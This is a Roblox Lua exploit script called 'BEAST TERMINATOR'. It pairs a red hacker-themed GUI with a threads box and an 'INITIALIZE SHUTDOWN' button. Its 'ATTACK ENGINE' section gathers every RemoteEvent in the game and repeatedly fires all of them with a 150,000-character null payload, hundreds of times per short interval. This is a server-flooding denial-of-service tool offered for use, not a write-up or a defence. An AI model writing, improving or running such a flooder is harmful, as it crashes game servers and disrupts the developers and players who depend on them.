-- [[ BEAST TERMINATOR: ULTIMATE CYBER VISUAL ]] --
local HttpService = game:GetService("HttpService")
local RunService = game:GetService("RunService")
local CoreGui = game:GetService("CoreGui")
local UserInputService = game:GetService("UserInputService")

local isFlooding = false
local intensity = 100
local payload = string.rep("\0", 150000)

-- [[ UI CONSTRUCTION ]] --
local ScreenGui = Instance.new("ScreenGui", CoreGui)
local Main = Instance.new("Frame", ScreenGui)
Main.Size = UDim2.new(0, 380, 0, 450)
Main.Position = UDim2.new(0.5, -190, 0.3, 0)
Main.BackgroundColor3 = Color3.fromRGB(8, 8, 8)
Main.Visible = false
Instance.new("UICorner", Main)
local MainStroke = Instance.new("UIStroke", Main)
MainStroke.Color = Color3.fromRGB(255, 0, 0)
MainStroke.Thickness = 2

-- [[ ANIMATED TERMINAL MONITOR ]] --
local Monitor = Instance.new("Frame", Main)
Monitor.Size = UDim2.new(0.92, 0, 0, 140)
Monitor.Position = UDim2.new(0.04, 0, 0.05, 0)
Monitor.BackgroundColor3 = Color3.fromRGB(15, 0, 0)
Instance.new("UICorner", Monitor)
Instance.new("UIStroke", Monitor).Color = Color3.fromRGB(100, 0, 0)

local ConsoleTxt = Instance.new("TextLabel", Monitor)
ConsoleTxt.Size = UDim2.new(1, -20, 1, -30)
ConsoleTxt.Position = UDim2.new(0, 10, 0, 10)
ConsoleTxt.BackgroundTransparency = 1
ConsoleTxt.Text = "> SYSTEM_READY\n> BYPASS_NETWORK: ACTIVE\n> WAITING_FOR_USER_INPUT..."
ConsoleTxt.TextColor3 = Color3.fromRGB(255, 50, 50)
ConsoleTxt.Font = Enum.Font.Code
ConsoleTxt.TextSize = 11
ConsoleTxt.TextXAlignment = Enum.TextXAlignment.Left
ConsoleTxt.TextYAlignment = Enum.TextYAlignment.Top

-- LOADING BAR ANIMATION
local BarBack = Instance.new("Frame", Monitor)
BarBack.Size = UDim2.new(0.9, 0, 0, 6)
BarBack.Position = UDim2.new(0.05, 0, 0.85, 0)
BarBack.BackgroundColor3 = Color3.fromRGB(40, 0, 0)
Instance.new("UICorner", BarBack)

local BarFill = Instance.new("Frame", BarBack)
BarFill.Size = UDim2.new(0, 0, 1, 0)
BarFill.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
Instance.new("UICorner", BarFill)

-- [[ LOGIKA ANIMASI LOOP ]] --
task.spawn(function()
    local spinner = {"|", "/", "-", "\\"}
    local step = 0
    while true do
        if isFlooding then
            step = step + 1
            local char = spinner[step % #spinner + 1]
            local packetID = math.random(1000, 9999)
            
            ConsoleTxt.Text = string.format(
                "> EXECUTING_TERMINAL %s\n> INJECTING_NULL_DATA: #%d\n> LOAD_INTENSITY: %d%%\n> PACKET_STATUS: SENDING...",
                char, packetID, math.min(intensity/10, 100)
            )
            
            -- Animate Bar Fill
            BarFill:TweenSize(UDim2.new(1, 0, 1, 0), "Out", "Quad", 0.5)
            task.wait(0.5)
            BarFill.Size = UDim2.new(0, 0, 1, 0)
        else
            ConsoleTxt.Text = "> SYSTEM_IDLE\n> READY_TO_TERMINATE\n> ENCRYPTION: SECURE"
            BarFill.Size = UDim2.new(0, 0, 1, 0)
            task.wait(0.5)
        end
    end
end)

-- [[ INPUT & EXECUTION ]] --
local InputBox = Instance.new("TextBox", Main)
InputBox.Size = UDim2.new(0.92, 0, 0, 50)
InputBox.Position = UDim2.new(0.04, 0, 0.42, 0)
InputBox.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
InputBox.Text = "200"
InputBox.PlaceholderText = "THREADS (1-1000)"
InputBox.TextColor3 = Color3.new(1,1,1)
InputBox.Font = Enum.Font.GothamBold
Instance.new("UICorner", InputBox)

local StartBtn = Instance.new("TextButton", Main)
StartBtn.Size = UDim2.new(0.92, 0, 0, 70)
StartBtn.Position = UDim2.new(0.04, 0, 0.58, 0)
StartBtn.BackgroundColor3 = Color3.fromRGB(150, 0, 0)
StartBtn.Text = "INITIALIZE SHUTDOWN"
StartBtn.TextColor3 = Color3.new(1,1,1)
StartBtn.Font = Enum.Font.GothamBold
StartBtn.TextSize = 16
Instance.new("UICorner", StartBtn)
local btnStroke = Instance.new("UIStroke", StartBtn)
btnStroke.Color = Color3.fromRGB(255, 255, 255)
btnStroke.Transparency = 0.8

-- ATTACK ENGINE
StartBtn.MouseButton1Click:Connect(function()
    isFlooding = not isFlooding
    if isFlooding then
        intensity = tonumber(InputBox.Text) or 200
        StartBtn.Text = "STOP_EXECUTION"
        StartBtn.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
        
        -- Start Attack Logic
        local remotes = {}
        for _, v in pairs(game:GetDescendants()) do
            if v:IsA("RemoteEvent") then table.insert(remotes, v) end
        end

        task.spawn(function()
            while isFlooding do
                for i = 1, intensity do
                    task.defer(function()
                        pcall(function()
                            HttpService:GetAsync("https://google.com/gen_204?z=" .. tick())
                            for _, r in pairs(remotes) do r:FireServer(payload) end
                        end)
                    end)
                end
                task.wait(0.08)
            end
        end)
    else
        StartBtn.Text = "INITIALIZE SHUTDOWN"
        StartBtn.BackgroundColor3 = Color3.fromRGB(150, 0, 0)
    end
end)

-- [[ DRAG & ICON ]] --
local Icon = Instance.new("ImageButton", ScreenGui)
Icon.Size = UDim2.new(0, 60, 0, 60)
Icon.Position = UDim2.new(0.05, 0, 0.45, 0)
Icon.BackgroundColor3 = Color3.fromRGB(15, 0, 0)
Icon.Image = "rbxassetid://6031094678"
Instance.new("UICorner", Icon).CornerRadius = UDim.new(1,0)
Instance.new("UIStroke", Icon).Color = Color3.fromRGB(255, 0, 0)

Icon.MouseButton1Click:Connect(function() Main.Visible = not Main.Visible end)

local function drag(o)
    local s, i, sp
    o.InputBegan:Connect(function(inp) if inp.UserInputType == Enum.UserInputType.MouseButton1 or inp.UserInputType == Enum.UserInputType.Touch then s = true; i = inp.Position; sp = o.Position end end)
    o.InputChanged:Connect(function(inp) if s and (inp.UserInputType == Enum.UserInputType.MouseMovement or inp.UserInputType == Enum.UserInputType.Touch) then local d = inp.Position - i; o.Position = UDim2.new(sp.X.Scale, sp.X.Offset + d.X, sp.Y.Scale, sp.Y.Offset + d.Y) end end)
    UserInputService.InputEnded:Connect(function(inp) if inp.UserInputType == Enum.UserInputType.MouseButton1 or inp.UserInputType == Enum.UserInputType.Touch then s = false end end)
end
drag(Icon); drag(Main)
